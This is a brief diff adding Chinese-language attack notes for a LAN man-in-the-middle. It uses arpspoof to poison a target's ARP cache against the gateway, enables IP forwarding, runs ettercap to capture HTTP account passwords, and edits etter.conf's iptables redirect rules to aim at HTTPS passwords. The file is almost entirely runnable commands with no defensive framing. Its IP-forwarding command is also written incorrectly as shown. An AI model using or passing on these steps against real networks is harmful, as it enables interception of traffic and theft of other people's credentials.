@@ -1,0 +1,26 @@
+arpspoof -i 网卡 -t 目标IP 网关 
+arpspoof -i eth0 -t 192.168.1.111 192.168.1.1
+
+通过arpspoof 进行arp欺骗 
+echo 1>/proc/sys/net/ipv4/ip_forward
+通过上面这条命令进行流量转发
+
+获取http的帐号密码
+ettercap -Tq -i eth0   T 命令行模式   q 安静模式
+
+
+
+获取https的帐号密码
+gedit /etc/ettercap/etter.conf
+
+#---------------
+#     Linux 
+#---------------
+
+# if you use ipchains:
+   #redir_command_on = "ipchains -A input -i %iface -p tcp -s 0/0 -d 0/0 %port -j REDIRECT %rport"
+   #redir_command_off = "ipchains -D input -i %iface -p tcp -s 0/0 -d 0/0 %port -j REDIRECT %rport"
+
+# if you use iptables:
+   redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
+   redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
